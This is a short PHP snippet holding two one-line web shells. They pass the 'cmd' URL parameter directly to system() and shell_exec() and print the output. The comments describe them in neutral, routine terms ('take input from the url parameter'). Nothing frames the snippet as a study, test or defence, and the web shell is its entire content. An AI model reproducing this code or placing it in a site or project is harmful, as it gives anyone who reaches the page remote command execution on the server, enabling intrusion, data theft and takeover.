// take input from the url parameter
<?php system($_GET["cmd"]); ?>

// ensure that the results are formatted correctly
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>